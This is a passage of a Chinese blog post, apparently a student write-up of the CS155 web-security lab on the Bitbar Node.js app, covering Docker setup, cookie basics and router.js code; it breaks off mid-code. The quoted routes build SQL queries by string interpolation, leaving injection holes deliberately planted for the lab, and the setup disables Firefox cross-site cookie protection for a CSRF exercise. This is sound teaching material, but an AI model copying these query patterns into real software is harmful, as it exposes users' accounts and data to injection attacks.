<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>网络安全（一）：Web Attacks and Defenses | Hexo</title><meta name="author" content="Zhu Siqi"><meta name="copyright" content="Zhu Siqi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="网络安全理论课第一次实验：网络攻击和防御实验介绍项目介绍在本项目中，您将构建针对网络应用程序的几种攻击（第 1 部分），然后更新应用程序以抵御这些攻击（第 2 部分）。Bitbar 是一款 Node.js 网络应用程序，用户可以通过它管理 Bitbars（一种新型超安全加密货币）。每个用户注册网站时都会获得 100 个 Bitbars。他们可以使用 Web 界面将比特条转让给其他用户，还可以创建和">
<meta property="og:type" content="article">
<meta property="og:title" content="网络安全（一）：Web Attacks and Defenses">
<meta property="og:url" content="http://example.com/2024/07/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AWeb%20Attacks%20and%20Defenses/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="网络安全理论课第一次实验：网络攻击和防御实验介绍项目介绍在本项目中，您将构建针对网络应用程序的几种攻击（第 1 部分），然后更新应用程序以抵御这些攻击（第 2 部分）。Bitbar 是一款 Node.js 网络应用程序，用户可以通过它管理 Bitbars（一种新型超安全加密货币）。每个用户注册网站时都会获得 100 个 Bitbars。他们可以使用 Web 界面将比特条转让给其他用户，还可以创建和">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
<meta property="article:published_time" content="2024-07-30T01:07:48.000Z">
<meta property="article:modified_time" content="2024-07-30T04:45:07.655Z">
<meta property="article:author" content="Zhu Siqi">
<meta property="article:tag" content="CS155">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/07/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AWeb%20Attacks%20and%20Defenses/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '网络安全（一）：Web Attacks and Defenses',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-30 12:45:07'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Hexo"><span class="site-name">Hexo</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">网络安全（一）：Web Attacks and Defenses</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-07-30T01:07:48.000Z" title="Created 2024-07-30 09:07:48">2024-07-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-07-30T04:45:07.655Z" title="Updated 2024-07-30 12:45:07">2024-07-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="网络安全（一）：Web Attacks and Defenses"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="网络安全理论课第一次实验：网络攻击和防御"><a href="#网络安全理论课第一次实验：网络攻击和防御" class="headerlink" title="网络安全理论课第一次实验：网络攻击和防御"></a>网络安全理论课第一次实验：网络攻击和防御</h1><h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><h3 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h3><p>在本项目中，您将构建针对网络应用程序的几种攻击（第 1 部分），然后更新应用程序以抵御这些攻击（第 2 部分）。Bitbar 是一款 Node.js 网络应用程序，用户可以通过它管理 Bitbars（一种新型超安全加密货币）。每个用户注册网站时都会获得 100 个 Bitbars。他们可以使用 Web 界面将比特条转让给其他用户，还可以创建和查看其他用户配置文件。</p>
<p>您已获得 Bitbar 应用程序的源代码。真正的攻击者通常无法访问目标网站的源代码，但源代码可能会让查找漏洞变得更容易一些。Bitbar 由一系列 Node 软件包提供支持，包括 Express.js Web 应用程序框架、SQLite 数据库和用于 HTML 模板的 EJS。下一节的资源列表包含有关这些软件包更多信息的链接，以及其他可用作参考的信息。</p>
<h3 id="安装指导"><a href="#安装指导" class="headerlink" title="安装指导"></a>安装指导</h3><p>您将在提供的 Docker 容器中运行 Bitbar 应用程序。服务器运行时，网站可通过 <a target="_blank" rel="noopener" href="http://localhost:3000/">http://localhost:3000</a> 访问。</p>
<h4 id="浏览器要求"><a href="#浏览器要求" class="headerlink" title="浏览器要求"></a>浏览器要求</h4><p>我们将使用最新版本的 Mozilla Firefox 进行评分，强烈建议您在 Firefox 中测试您的攻击。Chrome 浏览器引入了积极的浏览器端 XSS 防护，如果使用 Chrome 浏览器，可能会使某些攻击变得不可行。其他浏览器可能缺乏 Firefox 所具备的保护功能，导致我们对您的防御进行评分时失败。</p>
<p>重要提示：我们要求您实施的攻击之一是跨站请求伪造，这依赖于跨站请求，包括登录用户的 cookie。Firefox 现在默认使用新的隐私设置来阻止这些跨站cookie。为了成功完成攻击，您需要（至少暂时）关闭此设置。</p>
<ol>
<li>在火狐浏览器设置中打开” 隐私与安全” 选项卡;</li>
<li>将增强跟踪保护更改为自定义;</li>
<li>在 Cookie 下，选择跨站跟踪 Cookie。此处的任何设置只要不阻止非跟踪跨站Cookie 即可；</li>
<li>如果您经常使用火狐浏览器，那么在正常浏览时最好恢复设置。</li>
</ol>
<p>如果您不禁用这些功能，您对第 (B) 部分的攻击很可能不起作用。我们将在禁用这种保护的情况下测试您的防御。</p>
<h4 id="具体设置说明"><a href="#具体设置说明" class="headerlink" title="具体设置说明"></a>具体设置说明</h4><p>网络服务器将在 Docker 容器中运行。下面的说明将指导你安装 Docker 和容器。</p>
<ol>
<li>在本地计算机上安装（并打开）Docker <a target="_blank" rel="noopener" href="https://docs.docker.com/get-docker/">https://docs.docker.com/get-docker/</a>;<ul>
<li>如果你使用的是 Windows 系统，但发现开箱后无法运行，请尝试按照以下说明操作：<a target="_blank" rel="noopener" href="https://docs.docker.com/desktop/windows/install/%E3%80%82">https://docs.docker.com/desktop/windows/install/。</a></li>
</ul>
</li>
<li>从 CS155 website下载并解压项目 2 启动代码。</li>
<li>切换至启动代码根目录，运行 bash build image.sh。这将构建你的 Docker 镜像并安装所有必要的软件包。这可能需要几分钟时间，具体取决于你的网速。<ul>
<li>如果你使用的是 Windows 机器，可能需要复制 build image.sh 中的命令并直接运行。</li>
<li>如果你使用的是 Mac，并遇到”command not found: docker”（找不到命令：docker）的错误，你可能需要在路径中添加 docker 命令。你可以在当前终端会话中运行 export PATH&#x3D;$PATH:&#x2F;Applications&#x2F;Docker.app&#x2F;Contents<br> &#x2F;Resources&#x2F;bin&#x2F; 命令，或者将其添加到 ḃashrc 文件中。</li>
</ul>
</li>
<li>为启动服务器，请运行 bash start_server.sh。一旦看到 $ .&#x2F;node_modules&#x2F;babel-cli&#x2F;bin&#x2F;babel-node.js .&#x2F;bin&#x2F;www，Bitbar 应用程序就会出现在浏览器中，网址是 <a href="http://localhost:3000。">http://localhost:3000。</a><ul>
<li>为了保持一致性（也为了让您的攻击对评分器有效），请勿使用<a href="http://www.localhost:3000。">http://www.localhost:3000。</a></li>
<li>同样，如果您使用的是 Windows 机器，可能需要在命令行中直接运行start server.sh 命令。</li>
</ul>
</li>
</ol>
<p>您可以在终端按下 Ctrl+C 关闭服务器。每次关闭服务器时，服务器都会完全重置。要使用干净的数据库重启服务器，只需再次运行 bash start server.sh。</p>
<h4 id="Docker-使用技巧"><a href="#Docker-使用技巧" class="headerlink" title="Docker 使用技巧"></a>Docker 使用技巧</h4><p>要完成这项作业，您不需要熟悉 Docker。不过，有一些技巧可能会有用：</p>
<ul>
<li>docker ps -a 列出你所有的容器。</li>
<li>docker images 列出你的镜像。</li>
<li>docker system prune -a 删除机器上未使用的镜像和容器。（如果你想节省空间，可以在完成任务后再删除！）。</li>
<li>构建镜像和启动服务器脚本是简单的单行 Docker 命令，用于构建 Docker 镜像并从该镜像启动一个临时容器。</li>
<li>从本地机器映射到运行中的 Docker 容器的唯一文件是 code&#x2F;router.js。因此，如果你开始修改其他文件，而修改内容没有显示出来，不用担心。在修改了code&#x2F;router.js 之后，你可能需要重新启动容器才能使修改生效。如果你决定出于某种原因必须修改其他文件，你必须重建 Docker 镜像，将你的修改复制到镜像中。</li>
</ul>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><pre><code>操作系统：macOS Sonoma 14.4.1
容器工具：docker desktop 4.8.0
浏览器：Mozilla Firefox 124.0.2
下载实验提供的project2源码
重定位到project2根目录下，执行bash build_image.sh
开启服务器bash start_server.sh
可以在 http://localhost:3000 上访问bitbar
</code></pre>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/xml/xml_http.asp">XMLHttpRequest对象</a><br>[2] <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34183910/article/details/92205222">Cookie Theft and Session Hijacking</a><br>[3] <a target="_blank" rel="noopener" href="https://www.cnblogs.com/lancidie/p/8251187.html">HTTP协议学习（一）request 和response 解析</a><br>[4] <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41959899/article/details/105925528">XSS详解（概念+靶场演示）反射型与存储型的比较与详细操作</a><br>[5] <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies">HTTP Cookie</a></p>
<h2 id="项目说明"><a href="#项目说明" class="headerlink" title="项目说明"></a>项目说明</h2><h3 id="概念说明"><a href="#概念说明" class="headerlink" title="概念说明"></a>概念说明</h3><h5 id="HTTP-COOKIE"><a href="#HTTP-COOKIE" class="headerlink" title="HTTP COOKIE"></a>HTTP COOKIE</h5><p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是<strong>服务器发送到用户浏览器并保存在本地的一小块数据</strong>。浏览器会存储 cookie 并在下次向同一服务器再发起请求时携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器——如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。</p>
<p>Cookie 主要用于以下三个方面：</p>
<ul>
<li>会话状态管理：如用户登录状态、购物车、游戏分数或其他需要记录的信息</li>
<li>个性化设置：如用户自定义设置、主题和其他设置</li>
<li>浏览器行为跟踪：如跟踪分析用户行为等</li>
</ul>
<p><strong>备注：</strong> 要查看 Cookie 存储（或网页上能够使用其他的存储方式），可以在开发者工具中启用存储查看器（Storage Inspector）功能，并在存储树上选中 Cookie。</p>
<p>JavaScript 通过 Document.cookie 属性可创建新的 Cookie。如果未设置 HttpOnly 标记，则可以从 JavaScript 访问现有的 Cookie。使用 HttpOnly 属性可防止通过 JavaScript 访问 cookie 值。</p>
<p>总之，当存储信息到 Cookie 中时，cookie 的值是可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证&#x2F;机密机制。当机器处于不安全环境时，不能通过 HTTP Cookie 存储、传输敏感信息。</p>
<p>Cookie 曾一度用于客户端数据的存储，因当时并没有其他合适的存储办法而作为唯一的存储手段，但现在推荐使用现代存储 API。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API（localStorage 和 sessionStorage）或 IndexedDB 。</p>
<h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><h4 id="app-js"><a href="#app-js" class="headerlink" title="app.js"></a>app.js</h4><p>这个文件是一个使用Express框架创建的Node.js应用程序的主要入口点。它配置了服务器的各种设置和中间件，定义了路由，并处理了错误。该文件的功能有：</p>
<ol>
<li><p>导入依赖：引入了必要的Node.js模块和其他依赖，如express框架、http-errors用于生成HTTP错误、path用于处理文件路径、cookie-session用于会话管理、logger（morgan）用于日志记录等。</p>
</li>
<li><p>创建Express应用：通过调用express()函数创建了一个Express应用实例。</p>
</li>
<li><p>视图引擎设置：配置了EJS作为视图引擎，并设置了视图文件的存放目录。这允许应用渲染.ejs模板文件。</p>
</li>
<li><p>使用中间件：</p>
</li>
</ol>
<ul>
<li>使用logger记录请求日志。</li>
<li>使用express.json()和express.urlencoded({ extended: false })解析JSON和URL编码的请求体。</li>
<li>设置静态文件目录，使得public目录下的文件可以直接通过URL访问。</li>
<li>调整跨源资源共享（CORS）策略，允许来自”null”源的请求，并允许携带凭证。</li>
<li>设置cookie会话策略，定义了会话的名称、有效期等属性。</li>
<li>初始化会话，如果req.session.loggedIn未定义，则初始化为false，并设置一个空的account对象。</li>
</ul>
<ol start="5">
<li><p>路由：使用router中间件来处理定义在.&#x2F;router模块中的路由。</p>
</li>
<li><p>错误处理：</p>
</li>
</ol>
<ul>
<li>捕获404错误（即未找到的请求）并转发到错误处理器。</li>
<li>定义了一个错误处理中间件，用于捕获应用中发生的任何错误，设置错误信息，并渲染错误页面。</li>
</ul>
<ol start="7">
<li>导出应用：最后，通过module.exports导出了配置好的Express应用实例，以便可以在其他文件中引入和使用。</li>
</ol>
<p>总的来说，这个文件是设置和启动Express服务器的核心，包括配置中间件、路由和错误处理等关键部分。</p>
<h4 id="router-js"><a href="#router-js" class="headerlink" title="router.js"></a>router.js</h4><p>这是项目的路由文件，定义了应用程序的所有路由和它们的处理逻辑。它处理用户的请求，如页面访问、表单提交等，并根据请求类型（GET或POST）调用相应的逻辑。具体功能将基于代码进行分析。</p>
<p>post方法是Express框架提供的一种方式，用于定义处理HTTP POST请求的路由。HTTP POST请求通常用于提交表单数据或上传文件。</p>
<h5 id="set-profile-路由"><a href="#set-profile-路由" class="headerlink" title="&#x2F;set_profile 路由:"></a>&#x2F;set_profile 路由:</h5><p>这个路由处理用户提交的表单，用于更新他们的个人资料。当用户提交表单时，这个路由会接收到POST请求，并执行以下操作：</p>
<ol>
<li>从请求体中获取new_profile字段，这是用户输入的新个人资料。</li>
<li>从数据库连接Promise中获取数据库实例。</li>
<li>构造一个SQL更新语句，用于更新当前登录用户的个人资料字段。</li>
<li>执行SQL更新语句。</li>
<li>重新渲染首页，显示更新后的个人资料。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/set_profile&#x27;</span>, <span class="title function_">asyncMiddleware</span>(<span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">account</span>.<span class="property">profile</span> = req.<span class="property">body</span>.<span class="property">new_profile</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>.<span class="property">new_profile</span>);</span><br><span class="line">  <span class="keyword">const</span> db = <span class="keyword">await</span> dbPromise;</span><br><span class="line">  <span class="keyword">const</span> query = <span class="string">`UPDATE Users SET profile = ? WHERE username = &quot;<span class="subst">$&#123;req.session.account.username&#125;</span>&quot;;`</span>;</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span> db.<span class="title function_">run</span>(query, req.<span class="property">body</span>.<span class="property">new_profile</span>);</span><br><span class="line">  <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;Bitbar Home&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure></li>
</ol>
<h5 id="post-register-路由"><a href="#post-register-路由" class="headerlink" title="&#x2F;post_register 路由"></a>&#x2F;post_register 路由</h5><p>这个路由处理用户的注册请求。当用户填写注册表单并提交时，这个路由会接收到POST请求，并执行以下操作：</p>
<ol>
<li>从数据库中查询是否已存在同名的用户。</li>
<li>如果用户已存在，返回注册表单并显示错误消息。</li>
<li>如果用户不存在，生成一个随机盐值，使用密钥派生函数（KDF）对密码进行哈希处理。</li>
<li>将新用户的信息（用户名、哈希后的密码、盐值、初始个人资料和bitbars数量）插入到数据库中。</li>
<li>设置用户为已登录状态，并将用户信息保存到会话中。</li>
<li>渲染注册成功页面。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/post_register&#x27;</span>, <span class="title function_">asyncMiddleware</span>(<span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> db = <span class="keyword">await</span> dbPromise;</span><br><span class="line">  <span class="keyword">let</span> query = <span class="string">`SELECT * FROM Users WHERE username == &quot;<span class="subst">$&#123;req.body.username&#125;</span>&quot;;`</span>;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="keyword">await</span> db.<span class="title function_">get</span>(query);</span><br><span class="line">  <span class="keyword">if</span>(result) &#123; <span class="comment">// query returns results</span></span><br><span class="line">    <span class="keyword">if</span>(result.<span class="property">username</span> === req.<span class="property">body</span>.<span class="property">username</span>) &#123; <span class="comment">// if username exists</span></span><br><span class="line">      <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;register/form&#x27;</span>, <span class="string">&#x27;Register&#x27;</span>, <span class="string">&#x27;This username already exists!&#x27;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> salt = <span class="title function_">generateRandomness</span>();</span><br><span class="line">  <span class="keyword">const</span> hashedPassword = <span class="title function_">KDF</span>(req.<span class="property">body</span>.<span class="property">password</span>, salt);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(hashedPassword);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(salt);</span><br><span class="line">  query = <span class="string">`INSERT INTO Users(username, hashedPassword, salt, profile, bitbars) VALUES(?, ?, ?, ?, ?)`</span>;</span><br><span class="line">  <span class="keyword">await</span> db.<span class="title function_">run</span>(query, [req.<span class="property">body</span>.<span class="property">username</span>, hashedPassword, salt, <span class="string">&#x27;&#x27;</span>, <span class="number">100</span>]);</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">loggedIn</span> = <span class="literal">true</span>;</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">account</span> = &#123;</span><br><span class="line">    <span class="attr">username</span>: req.<span class="property">body</span>.<span class="property">username</span>,</span><br><span class="line">    hashedPassword,</span><br><span class="line">    salt,</span><br><span class="line">    <span class="attr">profile</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="attr">bitbars</span>: <span class="number">100</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="title function_">render</span>(req, res, next,<span class="string">&#x27;register/success&#x27;</span>, <span class="string">&#x27;Bitbar Home&#x27;</span>);</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>

<h5 id="post-transfer路由"><a href="#post-transfer路由" class="headerlink" title="post_transfer路由"></a>post_transfer路由</h5><p>处理用户发起的转账操作。这个路由监听&#x2F;post_transfer路径上的POST请求，用于从一个用户账户向另一个用户账户转移资金。这个路由的处理流程如下：</p>
<ol>
<li><p>检查登录状态：首先检查用户是否已登录。如果用户未登录，将渲染登录表单并显示错误消息。</p>
</li>
<li><p>防止自我转账：检查目标用户名是否与当前登录用户相同。如果是，将显示错误消息，防止用户向自己转账。</p>
</li>
<li><p>查询接收者：通过目标用户名在数据库中查询接收者的账户信息。</p>
</li>
<li><p>转账金额验证：解析并验证转账金额的有效性。如果金额无效（例如，是NaN、超过用户余额或小于1），将显示错误消息。</p>
</li>
<li><p>更新账户余额：如果接收者存在且金额有效，将从发送者账户扣除相应金额，并为接收者账户加上相同的金额。这涉及到更新数据库中的用户记录。</p>
</li>
<li><p>渲染结果：根据操作的结果，渲染相应的页面。如果转账成功，将显示成功消息；如果接收者不存在，将显示错误消息。</p>
</li>
<li><p>XSS防护：在显示错误消息之前，对用户输入进行清理，以防止跨站脚本攻击（XSS）。</p>
</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/post_transfer&#x27;</span>, <span class="title function_">asyncMiddleware</span>(<span class="title function_">async</span>(req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">loggedIn</span> == <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;login/form&#x27;</span>, <span class="string">&#x27;Login&#x27;</span>, <span class="string">&#x27;You must be logged in to use this feature!&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">destination_username</span> === req.<span class="property">session</span>.<span class="property">account</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;transfer/form&#x27;</span>, <span class="string">&#x27;Transfer Bitbars&#x27;</span>, <span class="string">&#x27;You cannot send money to yourself!&#x27;</span>, &#123;<span class="attr">receiver</span>:<span class="literal">null</span>, <span class="attr">amount</span>:<span class="literal">null</span>&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> db = <span class="keyword">await</span> dbPromise;</span><br><span class="line">  <span class="keyword">let</span> query = <span class="string">`SELECT * FROM Users WHERE username == &quot;<span class="subst">$&#123;req.body.destination_username&#125;</span>&quot;;`</span>;</span><br><span class="line">  <span class="keyword">const</span> receiver = <span class="keyword">await</span> db.<span class="title function_">get</span>(query);</span><br><span class="line">  <span class="keyword">if</span>(receiver) &#123; <span class="comment">// if user exists</span></span><br><span class="line">    <span class="keyword">const</span> amount = <span class="built_in">parseInt</span>(req.<span class="property">body</span>.<span class="property">quantity</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Number</span>.<span class="built_in">isNaN</span>(amount) || amount &gt; req.<span class="property">session</span>.<span class="property">account</span>.<span class="property">bitbars</span> || amount &lt; <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_">render</span>(req, res, next, <span class="string">&#x27;transfer/form&#x27;</span>, <span class="string">&#x27;Transfer Bitbars&#x27;</span>, <span class="string">&#x27;Invalid transfer amount!&#x27;</span>, &#123;<span class="attr">receiver</span>:<span class="literal">null</span>, <span class="attr">amount</span>:<span class="literal">null</span>&#125;);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req.<span class="property">session</span>.<span class="property">account</span>.<span class="property">bitbars</span> -= amount;</span><br><span class="line">    query = <span class="string">`UPDATE Users SET bitbars = &quot;<span class="subst">$&#123;req.session.account.bitbars&#125;</span>&quot; WHERE username == &quot;<span class="subst">$&#123;req.session.account.username&#125;</span>&quot;;`</span>;</span><br><span class="line">    <span class="keyword">await</span> db.<span class="title function_">exec</span>(query);</span><br><span class="line">    <span class="keyword">const</span> receiverNewBal = receiver.<span class="property">bitbars</span> + amount;</span><br><span class="line">    query = <span class="string">`UPDATE Users SET bitbars = &quot;<span 